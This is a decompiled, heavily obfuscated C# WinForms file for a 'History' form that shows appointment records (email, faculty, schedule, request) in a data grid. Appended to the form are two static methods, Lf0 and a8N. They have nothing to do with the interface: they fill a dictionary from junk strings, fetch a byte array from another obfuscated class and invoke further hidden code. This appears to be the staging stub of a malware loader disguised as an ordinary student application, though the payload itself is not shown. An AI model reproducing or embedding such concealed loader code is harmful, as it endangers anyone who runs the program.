using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Co2;
using Lq12;
using Microsoft.VisualBasic.CompilerServices;
using Qz92;
using i4N3;
using o0N8;
using x4J2;
using y8SN;
using z7F;

namespace k9W;

[DesignerGenerated]
public class Jp0 : Form
{
	private IContainer components;

	private BindingSource _HistoryBindingSource;

	private BindingNavigator _HistoryBindingNavigator;

	private ToolStripButton _BindingNavigatorAddNewItem;

	private ToolStripLabel _BindingNavigatorCountItem;

	private ToolStripButton _BindingNavigatorMoveFirstItem;

	private ToolStripButton _BindingNavigatorMovePreviousItem;

	private ToolStripButton _BindingNavigatorMoveNextItem;

	private ToolStripSeparator _BindingNavigatorSeparator2;

	private DataGridViewTextBoxColumn _DataGridViewTextBoxColumn1;

	private DataGridViewTextBoxColumn _DataGridViewTextBoxColumn2;

	private DataGridViewTextBoxColumn _DataGridViewTextBoxColumn3;

	private DataGridViewTextBoxColumn _DataGridViewTextBoxColumn5;

	internal static string[] Listt;

	internal static Dictionary<string, object> mDic;

	internal static string dName;

	internal static string tName;

	internal static string mName;

	internal static string mArray;

	internal static string sArray;

	internal static string T;

	internal static string sNum;

	internal Panel p;

	internal q6SX d;

	internal Ez42 C;

	internal Gw8q l;

	internal ToolStripButton T;

	internal ToolStripSeparator Y;

	internal ToolStripTextBox I;

	internal ToolStripSeparator B;

	internal ToolStripButton U;

	internal ToolStripButton Q;

	internal DataGridView J;

	internal DataGridViewTextBoxColumn m;

	public Jp0()
	{
		((Form)this).add_Load((EventHandler)w5M);
		r6B();
	}

	protected override void Xz6(bool Qe8)
	{
		try
		{
			if (Qe8 && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(Qe8);
		}
	}

	private void r6B()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Expected O, but got Unknown
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		//IL_00b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Expected O, but got Unknown
		//IL_00c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cc: Expected O, but got Unknown
		//IL_00cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d7: Expected O, but got Unknown
		//IL_00d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e2: Expected O, but got Unknown
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Expected O, but got Unknown
		//IL_00ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f8: Expected O, but got Unknown
		//IL_00f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0103: Expected O, but got Unknown
		//IL_0104: Unknown result type (might be due to invalid IL or missing references)
		//IL_010e: Expected O, but got Unknown
		//IL_010f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0119: Expected O, but got Unknown
		//IL_011a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0124: Expected O, but got Unknown
		//IL_0125: Unknown result type (might be due to invalid IL or missing references)
		//IL_012f: Expected O, but got Unknown
		//IL_05ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_05b8: Expected O, but got Unknown
		//IL_0659: Unknown result type (might be due to invalid IL or missing references)
		//IL_0663: Expected O, but got Unknown
		//IL_06c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_06ca: Expected O, but got Unknown
		//IL_0727: Unknown result type (might be due to invalid IL or missing references)
		//IL_0731: Expected O, but got Unknown
		//IL_07c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_07ca: Expected O, but got Unknown
		//IL_084e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0858: Expected O, but got Unknown
		//IL_08b5: Unknown result type (might be due to invalid IL or missing references)
		//IL_08bf: Expected O, but got Unknown
		//IL_093f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0949: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Jp0));
		c7W(new Panel());
		t7B(new DataGridView());
		g1W(new DataGridViewTextBoxColumn());
		Tp9(new DataGridViewTextBoxColumn());
		Nw3(new DataGridViewTextBoxColumn());
		Kc1(new DataGridViewTextBoxColumn());
		y1S(new DataGridViewTextBoxColumn());
		Ay2(new BindingSource(components));
		Jt8(new q6SX());
		Sp2(new Ez42());
		k4X(new Gw8q());
		Tn9(new BindingNavigator(components));
		s4H(new ToolStripButton());
		Gi8(new ToolStripLabel());
		d3Z(new ToolStripButton());
		r7D(new ToolStripButton());
		To4(new ToolStripButton());
		Nq3(new ToolStripSeparator());
		Fi5(new ToolStripTextBox());
		f7X(new ToolStripSeparator());
		f9Y(new ToolStripButton());
		Qa8(new ToolStripButton());
		Ac8(new ToolStripSeparator());
		n0P(new ToolStripButton());
		((Control)Hj2()).SuspendLayout();
		((ISupportInitialize)o9F()).BeginInit();
		((ISupportInitialize)Et9()).BeginInit();
		((ISupportInitialize)Bc4()).BeginInit();
		((ISupportInitialize)x4K()).BeginInit();
		((Control)x4K()).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)Hj2()).get_Controls().Add((Control)(object)o9F());
		((Control)Hj2()).set_Location(new Point(12, 41));
		((Control)Hj2()).set_Name("Panel1");
		((Control)Hj2()).set_Size(new Size(545, 226));
		((Control)Hj2()).set_TabIndex(0);
		o9F().set_AutoGenerateColumns(false);
		o9F().set_ColumnHeadersHeightSizeMode((DataGridViewColumnHeadersHeightSizeMode)2);
		o9F().get_Columns().AddRange((DataGridViewColumn[])(object)new DataGridViewColumn[5]
		{
			(DataGridViewColumn)d6Q(),
			(DataGridViewColumn)Lf6(),
			(DataGridViewColumn)i8F(),
			(DataGridViewColumn)i4Z(),
			(DataGridViewColumn)n2S()
		});
		o9F().set_DataSource((object)Et9());
		((Control)o9F()).set_Location(new Point(0, 3));
		((Control)o9F()).set_Name("HistoryDataGridView");
		((Control)o9F()).set_Size(new Size(542, 220));
		((Control)o9F()).set_TabIndex(0);
		((DataGridViewColumn)d6Q()).set_DataPropertyName("Email");
		((DataGridViewColumn)d6Q()).set_HeaderText("Email");
		((DataGridViewColumn)d6Q()).set_Name("DataGridViewTextBoxColumn1");
		((DataGridViewColumn)Lf6()).set_DataPropertyName("Faculty");
		((DataGridViewColumn)Lf6()).set_HeaderText("Faculty");
		((DataGridViewColumn)Lf6()).set_Name("DataGridViewTextBoxColumn2");
		((DataGridViewColumn)i8F()).set_DataPropertyName("Schedule");
		((DataGridViewColumn)i8F()).set_HeaderText("Schedule");
		((DataGridViewColumn)i8F()).set_Name("DataGridViewTextBoxColumn3");
		((DataGridViewColumn)i4Z()).set_DataPropertyName("Appointment");
		((DataGridViewColumn)i4Z()).set_HeaderText("Appointment");
		((DataGridViewColumn)i4Z()).set_Name("DataGridViewTextBoxColumn4");
		((DataGridViewColumn)n2S()).set_DataPropertyName("Request");
		((DataGridViewColumn)n2S()).set_HeaderText("Request");
		((DataGridViewColumn)n2S()).set_Name("DataGridViewTextBoxColumn5");
		Et9().set_DataMember("History");
		Et9().set_DataSource((object)Bc4());
		Bc4().DataSetName = "Database1DataSet";
		Bc4().SchemaSerializationMode = SchemaSerializationMode.IncludeSchema;
		Tg6().ClearBeforeFill = true;
		x0W().BackupDataSetBeforeUpdate = false;
		x0W().FloginTableAdapter = null;
		x0W().HistoryTableAdapter = Tg6();
		x0W().PendingTableAdapter = null;
		x0W().ScheduleTableAdapter = null;
		x0W().SloginTableAdapter = null;
		x0W().UpdateOrder = Gw8q.w1F.InsertUpdateDelete;
		x4K().set_AddNewItem((ToolStripItem)(object)Lb2());
		x4K().set_BindingSource(Et9());
		x4K().set_CountItem((ToolStripItem)(object)Hj1());
		x4K().set_DeleteItem((ToolStripItem)(object)Bw5());
		((ToolStrip)x4K()).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[12]
		{
			(ToolStripItem)o4E(),
			(ToolStripItem)Xr6(),
			(ToolStripItem)Qd1(),
			(ToolStripItem)Qy0(),
			(ToolStripItem)Hj1(),
			(ToolStripItem)Ho5(),
			(ToolStripItem)e1R(),
			(ToolStripItem)x2N(),
			(ToolStripItem)k3Q(),
			(ToolStripItem)Lb2(),
			(ToolStripItem)Bw5(),
			(ToolStripItem)Ja5()
		});
		((Control)x4K()).set_Location(new Point(0, 0));
		x4K().set_MoveFirstItem((ToolStripItem)(object)o4E());
		x4K().set_MoveLastItem((ToolStripItem)(object)x2N());
		x4K().set_MoveNextItem((ToolStripItem)(object)e1R());
		x4K().set_MovePreviousItem((ToolStripItem)(object)Xr6());
		((Control)x4K()).set_Name("HistoryBindingNavigator");
		x4K().set_PositionItem((ToolStripItem)(object)Qy0());
		((Control)x4K()).set_Size(new Size(565, 25));
		((Control)x4K()).set_TabIndex(1);
		((Control)x4K()).set_Text("BindingNavigator1");
		((ToolStripItem)Lb2()).set_DisplayStyle((ToolStripItemDisplayStyle)2);
		((ToolStripItem)Lb2()).set_Image((Image)componentResourceManager.GetObject("BindingNavigatorAddNewItem.Image"));
		((ToolStripItem)Lb2()).set_Name("BindingNavigatorAddNewItem");
		((ToolStripItem)Lb2()).set_RightToLeftAutoMirrorImage(true);
		((ToolStripItem)Lb2()).set_Size(new Size(23, 22));
		((ToolStripItem)Lb2()).set_Text("Add new");
		((ToolStripItem)Hj1()).set_Name("BindingNavigatorCountItem");
		((ToolStripItem)Hj1()).set_Size(new Size(35, 22));
		((ToolStripItem)Hj1()).set_Text("of {0}");
		((ToolStripItem)Hj1()).set_ToolTipText("Total number of items");
		((ToolStripItem)Bw5()).set_DisplayStyle((ToolStripItemDisplayStyle)2);
		((ToolStripItem)Bw5()).set_Image((Image)componentResourceManager.GetObject("BindingNavigatorDeleteItem.Image"));
		((ToolStripItem)Bw5()).set_Name("BindingNavigatorDeleteItem");
		((ToolStripItem)Bw5()).set_RightToLeftAutoMirrorImage(true);
		((ToolStripItem)Bw5()).set_Size(new Size(23, 22));
		((ToolStripItem)Bw5()).set_Text("Delete");
		((ToolStripItem)o4E()).set_DisplayStyle((ToolStripItemDisplayStyle)2);
		((ToolStripItem)o4E()).set_Image((Image)componentResourceManager.GetObject("BindingNavigatorMoveFirstItem.Image"));
		((ToolStripItem)o4E()).set_Name("BindingNavigatorMoveFirstItem");
		((ToolStripItem)o4E()).set_RightToLeftAutoMirrorImage(true);
		((ToolStripItem)o4E()).set_Size(new Size(23, 22));
		((ToolStripItem)o4E()).set_Text("Move first");
		((ToolStripItem)Xr6()).set_DisplayStyle((ToolStripItemDisplayStyle)2);
		((ToolStripItem)Xr6()).set_Image((Image)componentResourceManager.GetObject("BindingNavigatorMovePreviousItem.Image"));
		((ToolStripItem)Xr6()).set_Name("BindingNavigatorMovePreviousItem");
		((ToolStripItem)Xr6()).set_RightToLeftAutoMirrorImage(true);
		((ToolStripItem)Xr6()).set_Size(new Size(23, 22));
		((ToolStripItem)Xr6()).set_Text("Move previous");
		((ToolStripItem)Qd1()).set_Name("BindingNavigatorSeparator");
		((ToolStripItem)Qd1()).set_Size(new Size(6, 25));
		((ToolStripItem)Qy0()).set_AccessibleName("Position");
		((ToolStripItem)Qy0()).set_AutoSize(false);
		((ToolStripControlHost)Qy0()).set_Font(new Font("Segoe UI", 9f));
		((ToolStripItem)Qy0()).set_Name("BindingNavigatorPositionItem");
		((ToolStripControlHost)Qy0()).set_Size(new Size(50, 23));
		((ToolStripControlHost)Qy0()).set_Text("0");
		((ToolStripItem)Qy0()).set_ToolTipText("Current position");
		((ToolStripItem)Ho5()).set_Name("BindingNavigatorSeparator1");
		((ToolStripItem)Ho5()).set_Size(new Size(6, 25));
		((ToolStripItem)e1R()).set_DisplayStyle((ToolStripItemDisplayStyle)2);
		((ToolStripItem)e1R()).set_Image((Image)componentResourceManager.GetObject("BindingNavigatorMoveNextItem.Image"));
		((ToolStripItem)e1R()).set_Name("BindingNavigatorMoveNextItem");
		((ToolStripItem)e1R()).set_RightToLeftAutoMirrorImage(true);
		((ToolStripItem)e1R()).set_Size(new Size(23, 22));
		((ToolStripItem)e1R()).set_Text("Move next");
		((ToolStripItem)x2N()).set_DisplayStyle((ToolStripItemDisplayStyle)2);
		((ToolStripItem)x2N()).set_Image((Image)componentResourceManager.GetObject("BindingNavigatorMoveLastItem.Image"));
		((ToolStripItem)x2N()).set_Name("BindingNavigatorMoveLastItem");
		((ToolStripItem)x2N()).set_RightToLeftAutoMirrorImage(true);
		((ToolStripItem)x2N()).set_Size(new Size(23, 22));
		((ToolStripItem)x2N()).set_Text("Move last");
		((ToolStripItem)k3Q()).set_Name("BindingNavigatorSeparator2");
		((ToolStripItem)k3Q()).set_Size(new Size(6, 25));
		((ToolStripItem)Ja5()).set_DisplayStyle((ToolStripItemDisplayStyle)2);
		((ToolStripItem)Ja5()).set_Image((Image)componentResourceManager.GetObject("HistoryBindingNavigatorSaveItem.Image"));
		((ToolStripItem)Ja5()).set_Name("HistoryBindingNavigatorSaveItem");
		((ToolStripItem)Ja5()).set_Size(new Size(23, 22));
		((ToolStripItem)Ja5()).set_Text("Save Data");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(565, 281));
		((Control)this).get_Controls().Add((Control)(object)x4K());
		((Control)this).get_Controls().Add((Control)(object)Hj2());
		((Control)this).set_Name("History");
		((Form)this).set_Text("History");
		((Control)Hj2()).ResumeLayout(false);
		((ISupportInitialize)o9F()).EndInit();
		((ISupportInitialize)Et9()).EndInit();
		((ISupportInitialize)Bc4()).EndInit();
		((ISupportInitialize)x4K()).EndInit();
		((Control)x4K()).ResumeLayout(false);
		((Control)x4K()).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual Panel Hj2()
	{
		return p;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void c7W(Panel Jq8)
	{
		Panel val = (p = Jq8);
	}

	[SpecialName]
	internal virtual q6SX Bc4()
	{
		return d;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Jt8(q6SX Km2)
	{
		q6SX q6SX = (d = Km2);
	}

	[SpecialName]
	internal virtual BindingSource Et9()
	{
		return _HistoryBindingSource;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ay2(BindingSource Kb8)
	{
		_HistoryBindingSource = Kb8;
	}

	[SpecialName]
	internal virtual Ez42 Tg6()
	{
		return C;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Sp2(Ez42 Km2)
	{
		Ez42 ez = (C = Km2);
	}

	[SpecialName]
	internal virtual Gw8q x0W()
	{
		return l;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void k4X(Gw8q Kt1)
	{
		Gw8q gw8q = (l = Kt1);
	}

	[SpecialName]
	internal virtual BindingNavigator x4K()
	{
		return _HistoryBindingNavigator;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Tn9(BindingNavigator i9T)
	{
		_HistoryBindingNavigator = i9T;
	}

	[SpecialName]
	internal virtual ToolStripButton Lb2()
	{
		return _BindingNavigatorAddNewItem;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void s4H(ToolStripButton Nc6)
	{
		_BindingNavigatorAddNewItem = Nc6;
	}

	[SpecialName]
	internal virtual ToolStripLabel Hj1()
	{
		return _BindingNavigatorCountItem;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Gi8(ToolStripLabel o4S)
	{
		_BindingNavigatorCountItem = o4S;
	}

	[SpecialName]
	internal virtual ToolStripButton Bw5()
	{
		return T;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void d3Z(ToolStripButton Jz0)
	{
		ToolStripButton val = (T = Jz0);
	}

	[SpecialName]
	internal virtual ToolStripButton o4E()
	{
		return _BindingNavigatorMoveFirstItem;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void r7D(ToolStripButton Db3)
	{
		_BindingNavigatorMoveFirstItem = Db3;
	}

	[SpecialName]
	internal virtual ToolStripButton Xr6()
	{
		return _BindingNavigatorMovePreviousItem;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void To4(ToolStripButton z9R)
	{
		_BindingNavigatorMovePreviousItem = z9R;
	}

	[SpecialName]
	internal virtual ToolStripSeparator Qd1()
	{
		return Y;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Nq3(ToolStripSeparator x2S)
	{
		ToolStripSeparator val = (Y = x2S);
	}

	[SpecialName]
	internal virtual ToolStripTextBox Qy0()
	{
		return I;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Fi5(ToolStripTextBox c3S)
	{
		ToolStripTextBox val = (I = c3S);
	}

	[SpecialName]
	internal virtual ToolStripSeparator Ho5()
	{
		return B;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void f7X(ToolStripSeparator Fa6)
	{
		ToolStripSeparator val = (B = Fa6);
	}

	[SpecialName]
	internal virtual ToolStripButton e1R()
	{
		return _BindingNavigatorMoveNextItem;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void f9Y(ToolStripButton Tt3)
	{
		_BindingNavigatorMoveNextItem = Tt3;
	}

	[SpecialName]
	internal virtual ToolStripButton x2N()
	{
		return U;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Qa8(ToolStripButton n5Z)
	{
		ToolStripButton val = (U = n5Z);
	}

	[SpecialName]
	internal virtual ToolStripSeparator k3Q()
	{
		return _BindingNavigatorSeparator2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ac8(ToolStripSeparator Di5)
	{
		_BindingNavigatorSeparator2 = Di5;
	}

	[SpecialName]
	internal virtual ToolStripButton Ja5()
	{
		return Q;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void n0P(ToolStripButton q6C)
	{
		ToolStripButton val = (Q = q6C);
	}

	[SpecialName]
	internal virtual DataGridView o9F()
	{
		return J;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void t7B(DataGridView Yr3)
	{
		DataGridView val = (J = Yr3);
	}

	[SpecialName]
	internal virtual DataGridViewTextBoxColumn d6Q()
	{
		return _DataGridViewTextBoxColumn1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void g1W(DataGridViewTextBoxColumn Mg8)
	{
		_DataGridViewTextBoxColumn1 = Mg8;
	}

	[SpecialName]
	internal virtual DataGridViewTextBoxColumn Lf6()
	{
		return _DataGridViewTextBoxColumn2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Tp9(DataGridViewTextBoxColumn t7F)
	{
		_DataGridViewTextBoxColumn2 = t7F;
	}

	[SpecialName]
	internal virtual DataGridViewTextBoxColumn i8F()
	{
		return _DataGridViewTextBoxColumn3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Nw3(DataGridViewTextBoxColumn Bs9)
	{
		_DataGridViewTextBoxColumn3 = Bs9;
	}

	[SpecialName]
	internal virtual DataGridViewTextBoxColumn i4Z()
	{
		return m;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Kc1(DataGridViewTextBoxColumn x3K)
	{
		DataGridViewTextBoxColumn val = (m = x3K);
	}

	[SpecialName]
	internal virtual DataGridViewTextBoxColumn n2S()
	{
		return _DataGridViewTextBoxColumn5;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void y1S(DataGridViewTextBoxColumn c4E)
	{
		_DataGridViewTextBoxColumn5 = c4E;
	}

	private void w5M(object sender, EventArgs e)
	{
		Tg6().w1T8(Bc4().History);
	}

	internal static void Lf0(int Zc2)
	{
		mDic = new Dictionary<string, object>();
		Listt = new string[11]
		{
			"asat", "dfg", "ygyuou", "et", "yuo", "sg", "jhjl", "xc", "jk", "qwe",
			"jkoyys"
		};
		dName = Ry8.Br3(Listt, 0, 1);
		mDic.Add(dName, Listt);
		tName = Ry8.Br3(Listt, Zc2, 1);
		checked
		{
			mName = Ry8.Br3(Listt, Zc2 + 1, 2);
			mArray = Ry8.Br3(Listt, Zc2 + 2, 3);
			sArray = Ry8.Br3(Listt, Zc2 + 3, 4);
			Jp0.T = Ry8.Br3(Listt, Zc2 + 4, 5);
			sNum = Ry8.Br3(Listt, Zc2 + 5, 6);
			if ((double)Zc2 != 2503.0)
			{
				Zc2 = 51;
				mDic.Add(sNum, 51);
			}
			byte[] value = f1PK.z8BY(Zc2);
			mDic.Add(sArray, value);
			i9S4.x8G1();
		}
	}

	internal static byte[] a8N(int Pf2)
	{
		string[] array = new string[2] { "mkolk", "putin" };
		if (array == null)
		{
			return null;
		}
		return Da2i.Ty3(g9Q.b0M2(), Pf2);
	}
}
